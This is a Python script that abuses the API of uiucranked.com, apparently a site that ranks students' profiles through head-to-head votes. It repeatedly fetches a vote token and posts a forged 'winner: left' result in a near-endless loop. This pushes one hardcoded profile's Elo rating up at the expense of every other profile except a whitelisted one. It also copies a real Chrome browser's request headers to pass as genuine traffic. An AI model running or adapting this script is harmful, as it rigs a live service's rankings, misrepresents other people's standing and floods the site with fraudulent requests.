from datetime import datetime, timezone
import requests

action = "promote"

target_id = "67e257a74abaefa8b4285fc5"
jasmine = "67e218334abaefa8b4285dfb"
alice = "67e2a2e34abaefa8b42866ee"

whitelist = [target_id, jasmine]

def get_other_lists():
    data = requests.get("https://www.uiucranked.com/api/getLeaderboard")
    d = data.json()
    all_ids = [item["_id"] for item in d]
    # fix 
    return list(filter(lambda x: x != target_id and x not in whitelist, all_ids))



headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://www.uiucranked.com',
    'priority': 'u=1, i',
    'referer': 'https://www.uiucranked.com/',
    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
}

other_ids = get_other_lists() 

for i in range(0, 1000000000000):
    if action == "promote":
        # Get token
        ts = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
        if (i % 50 == 0):
            other_ids = get_other_lists()
        id = other_ids[0];

        payload = {"leftProfileId": target_id, "rightProfileId": id, "timestamp": ts}

        r = requests.post(
            "https://www.uiucranked.com/api/getToken",
            headers=headers,
            json=payload,  # Changed from data to json for proper JSON formatting
        )

        token_response = r.json()
        token = token_response["token"]

        # Update ELO
        update_payload = {
            "leftProfileId": target_id,
            "rightProfileId": id,
            "winner": "left",
            "timestamp": ts,
            "token": token,
        }

        r2 = requests.post(
            "https://www.uiucranked.com/api/updateElo",
            headers=headers,
            json=update_payload,  # Changed from data to json for proper JSON formatting
        )
        print(r2.json())
        print(r2.json()["leftNewRating"])
